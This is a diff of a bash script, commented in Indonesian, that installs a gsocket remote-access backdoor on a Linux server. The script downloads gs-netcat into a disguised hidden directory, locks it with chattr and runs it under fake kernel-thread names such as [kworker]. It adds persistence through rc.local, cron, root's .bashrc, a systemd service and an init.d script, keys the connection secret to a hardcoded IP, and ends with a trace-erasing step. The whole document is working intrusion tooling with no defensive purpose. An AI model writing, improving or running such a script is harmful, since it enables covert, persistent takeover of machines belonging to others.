@@ -1,10 +1,10 @@
 #!/bin/bash
 # ============================================================
-# GSOCKET BACKDOOR ONLY - HIDDEN PERSISTENCE
+# GSOCKET BACKDOOR ONLY - HIDDEN PERSISTENCE (FIXED)
 # ============================================================
 
-VPS_IP=$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print $1}')
-GSOCKET_SECRET="${VPS_IP}@dark-ai"
+VPS_IP=\$(curl -s -4 --max-time 5 ifconfig.me 2>/dev/null || hostname -I 2>/dev/null | awk '{print \$1}')
+GSOCKET_SECRET="\${VPS_IP}@dark-ai"
 
 HIDDEN_DIR="/usr/share/man/.cache"
 BINARY_NAME="systemd-helper"
@@ -13,27 +13,27 @@ GS_NETCAT="$HIDDEN_DIR/$BINARY_NAME"
 PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")
 
 echo "=========================================="
-echo " GSOCKET BACKDOOR INSTALLER - ONLY"
+echo " GSOCKET BACKDOOR INSTALLER - FIXED"
 echo "=========================================="
 
 # ============================================================
-# 1. GSOCKET HIDDEN (DIPERBAIKI)
+# 1. GSOCKET HIDDEN
 # ============================================================
-mkdir -p "$HIDDEN_DIR" 2>/dev/null
-chmod 755 "$HIDDEN_DIR" 2>/dev/null
+mkdir -p "\$HIDDEN_DIR" 2>/dev/null
+chmod 755 "\$HIDDEN_DIR" 2>/dev/null
 
-if [ ! -f "$GS_NETCAT" ]; then
+if [ ! -f "\$GS_NETCAT" ]; then
     echo "Mengunduh GSocket binary..."
     # Coba beberapa URL fallback
-    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686 -O "$GS_NETCAT" 2>/dev/null || \
-    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "$GS_NETCAT" 2>/dev/null || \
-    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat -O "$GS_NETCAT" 2>/dev/null || \
-    curl -s https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686 -o "$GS_NETCAT" 2>/dev/null || \
-    curl -s https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "$GS_NETCAT" 2>/dev/null || \
-    curl -s https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat -o "$GS_NETCAT" 2>/dev/null
+    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686 -O "\$GS_NETCAT" 2>/dev/null || \
+    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -O "\$GS_NETCAT" 2>/dev/null || \
+    wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat -O "\$GS_NETCAT" 2>/dev/null || \
+    curl -s https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-i686 -o "\$GS_NETCAT" 2>/dev/null || \
+    curl -s https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 -o "\$GS_NETCAT" 2>/dev/null || \
+    curl -s https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat -o "\$GS_NETCAT" 2>/dev/null
     
-    if [ -f "$GS_NETCAT" ]; then
-        chmod +x "$GS_NETCAT"
+    if [ -f "\$GS_NETCAT" ]; then
+        chmod +x "\$GS_NETCAT"
         echo "GSocket binary berhasil diunduh"
     else
         echo "Gagal mengunduh GSocket binary"
@@ -42,46 +42,68 @@ if [ ! -f "$GS_NETCAT" ]; then
 else
     echo "GSocket binary sudah ada"
 fi
-chattr +i "$GS_NETCAT" 2>/dev/null
+chattr +i "\$GS_NETCAT" 2>/dev/null
 
 # ============================================================
-# 2. MENJALANKAN GSOCKET
+# 2. BUAT SCRIPT LAUNCHER TERSEMBUNYI
 # ============================================================
-PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % ${#PROCESS_NAMES[@]}))]}"
-echo "Menjalankan GSocket dengan nama proses: $PROCESS_NAME"
+# Buat script launcher yang akan menjalankan GSocket tanpa output
+cat > "\$HIDDEN_DIR/.launch" << 'EOF'
+#!/bin/bash
+# Script launcher tersembunyi untuk GSocket
+# Tidak menghasilkan output apapun
 
 # Hentikan proses lama jika ada
-pkill -f "$BINARY_NAME" 2>/dev/null
+pkill -f "systemd-helper" 2>/dev/null
 
-# Jalankan proses baru
-GSOCKET_ARGS="-s $GSOCKET_SECRET -liqD" exec -a "$PROCESS_NAME" "$GS_NETCAT" &
+# Jalankan GSocket dengan nama proses acak
+PROCESS_NAMES=("[crypto/0]" "[kworker/0:1]" "[kworker/1:2]" "[scsi_eh_0]" "[jbd2/sda1-8]" "[ext4-dio-unwrit]")
+PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % \${#PROCESS_NAMES[@]}))]}"
+
+# Jalankan tanpa output
+exec -a "\$PROCESS_NAME" /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD 2>/dev/null &
+EOF
+
+chmod +x "\$HIDDEN_DIR/.launch"
+chattr +i "\$HIDDEN_DIR/.launch" 2>/dev/null
+
+# ============================================================
+# 3. MENJALANKAN GSOCKET
+# ============================================================
+echo "Menjalankan GSocket..."
+# Hentikan proses lama jika ada
+pkill -f "\$BINARY_NAME" 2>/dev/null
+
+# Jalankan proses baru tanpa output
+PROCESS_NAME="${PROCESS_NAMES[$((RANDOM % \${#PROCESS_NAMES[@]}))]}"
+exec -a "$PROCESS_NAME" "$GS_NETCAT" -s "\$GSOCKET_SECRET" -liqD 2>/dev/null &
 
 # Verifikasi proses berjalan
 sleep 2
-if pgrep -f "$BINARY_NAME" > /dev/null; then
+if pgrep -f "\$BINARY_NAME" > /dev/null; then
     echo "GSocket berhasil dijalankan"
 else
     echo "Gagal menjalankan GSocket"
 fi
 
 # ============================================================
-# 3. PERSISTENCE (DIPERBAIKI)
+# 4. PERSISTENCE (DIPERBAIKI - TANPA OUTPUT)
 # ============================================================
 echo "Mengatur persistence..."
 
 # Metode 1: rc.local
 if [ -f /etc/rc.local ]; then
-    grep -q "$BINARY_NAME" /etc/rc.local 2>/dev/null || \
-    echo "nohup $GS_NETCAT -s $GSOCKET_SECRET -liqD > /dev/null 2>&1 &" >> /etc/rc.local
+    grep -q "\$BINARY_NAME" /etc/rc.local 2>/dev/null || \
+    sed -i '/^exit 0/i\bash -c "exec -a \"[kworker]\" /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD" &>/dev/null &' /etc/rc.local 2>/dev/null
 fi
 
-# Metode 2: crontab
-(crontab -l 2>/dev/null; echo "@reboot nohup $GS_NETCAT -s $GSOCKET_SECRET -liqD > /dev/null 2>&1 &") | crontab -
-(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || nohup $GS_NETCAT -s $GSOCKET_SECRET -liqD > /dev/null 2>&1 &") | crontab -
+# Metode 2: crontab dengan redirect output ke /dev/null
+(crontab -l 2>/dev/null | grep -v "\$BINARY_NAME"; echo "@reboot bash -c \"exec -a '[kworker]' /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD\" &>/dev/null &") | crontab -
+(crontab -l 2>/dev/null | grep -v "\$BINARY_NAME"; echo "*/5 * * * * pgrep -f systemd-helper >/dev/null 2>&1 || bash -c \"exec -a '[kworker]' /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD\" &>/dev/null &") | crontab -
 
-# Metode 3: bashrc
-grep -q "$BINARY_NAME" /root/.bashrc 2>/dev/null || \
-echo "pgrep -f '$BINARY_NAME' >/dev/null 2>&1 || nohup $GS_NETCAT -s $GSOCKET_SECRET -liqD > /dev/null 2>&1 &" >> /root/.bashrc
+# Metode 3: bashrc dengan redirect output ke /dev/null
+sed -i '/systemd-helper/d' /root/.bashrc 2>/dev/null
+echo 'pgrep -f systemd-helper >/dev/null 2>&1 || bash -c "exec -a \"[kworker]\" /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD" &>/dev/null &' >> /root/.bashrc
 
 # Metode 4: systemd
 if command -v systemctl >/dev/null 2>&1; then
@@ -92,10 +114,12 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=$GS_NETCAT -s $GSOCKET_SECRET -liqD
+ExecStart=/usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD
 Restart=always
 RestartSec=5
 User=root
+StandardOutput=null
+StandardError=null
 
 [Install]
 WantedBy=multi-user.target
@@ -109,15 +133,15 @@ fi
 cat > /etc/init.d/systemd-helper << INIT_EOF
 #!/bin/bash
 case "\$1" in
-    start) nohup $GS_NETCAT -s $GSOCKET_SECRET -liqD > /dev/null 2>&1 & ;;
-    stop) pkill -f "$BINARY_NAME" ;;
+    start) exec -a "[kworker]" /usr/share/man/.cache/systemd-helper -s 67.231.30.230@dark-ai -liqD >/dev/null 2>&1 & ;;
+    stop) pkill -f "systemd-helper" ;;
 esac
 INIT_EOF
 chmod +x /etc/init.d/systemd-helper
 chkconfig systemd-helper on 2>/dev/null || update-rc.d systemd-helper defaults 2>/dev/null
 
 # ============================================================
-# 4. HAPUS JEJAK
+# 5. HAPUS JEJAK
 # ============================================================
 echo "Menghapus jejak..."
 
